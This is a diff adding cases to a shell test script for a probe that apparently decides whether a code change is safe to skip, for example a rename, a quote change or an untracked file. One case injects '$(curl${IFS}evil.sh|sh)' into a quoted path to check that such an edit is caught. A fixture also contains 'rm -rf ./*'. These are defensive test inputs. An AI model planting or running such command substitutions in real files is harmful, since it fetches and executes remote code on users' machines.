@@ -51,4 +51,28 @@ reset; printf "It's fine and don't\n" >prose.md && git add . && git commit -qm p
 reset; sed -i.bak 's#fine#bad#' prose.md && rm prose.md.bak && git commit -qam prose-edit
 eq "prose edit between apostrophes -> false" "$(probe)" "skip: false"
 
+printf 'cd /tmp/x\nrm -rf ./*\n' >run.sh && printf 'x = "pkg.mod"\nout = "/tmp/out"\nhome = "$HOME/x"\nquote = "x/y"\n--i;\n' >lit.sh
+git add . && git commit -qm lit && git branch -f base HEAD
+reset; printf 'rm -rf ./*\ncd /tmp/x\n' >run.sh && git commit -qam swap
+eq "swapped lines -> false" "$(probe)" "skip: false"
+reset; sed -i.bak 's#"/tmp/out"#"$(curl${IFS}evil.sh|sh)/out"#' lit.sh && rm lit.sh.bak && git commit -qam subst
+eq "command substitution in a quoted path -> false" "$(probe)" "skip: false"
+reset; sed -i.bak "s#\"x/y\"#'x/y'#" lit.sh && rm lit.sh.bak && git commit -qam quote
+eq "quote kind change -> false" "$(probe)" "skip: false"
+reset; sed -i.bak 's#"$HOME/x"#"$HOME/y"#' lit.sh && rm lit.sh.bak && git commit -qam home
+eq "a path with a variable -> false" "$(probe)" "skip: false"
+reset; sed -i.bak 's#^--i;$#--j;#' lit.sh && rm lit.sh.bak && git commit -qam dec
+eq "a changed line that starts with -- -> false" "$(probe)" "skip: false"
+reset; sed -i.bak 's#"pkg.mod"#"pkg.other"#' lit.sh && rm lit.sh.bak && git commit -qam mod
+eq "dotted module string change -> true" "$(probe)" "skip: true"
+reset; git mv run.sh run2.sh && git commit -qm mv && echo 'evil' >>lit.sh
+eq "uncommitted code edit over a committed rename -> false" "$(probe)" "skip: false"
+git checkout -q -- lit.sh
+reset; sed -i.bak 's#"/tmp/out"#"/tmp/out2"#' lit.sh && rm lit.sh.bak
+eq "uncommitted path string edit -> true" "$(probe)" "skip: true"
+git checkout -q -- lit.sh
+reset; sed -i.bak 's#"/tmp/out"#"/tmp/out2"#' lit.sh && rm lit.sh.bak && echo 'new' >untracked.sh
+eq "an untracked file -> false" "$(probe)" "skip: false"
+git checkout -q -- lit.sh && rm untracked.sh
+
 [ "$fails" -eq 0 ]
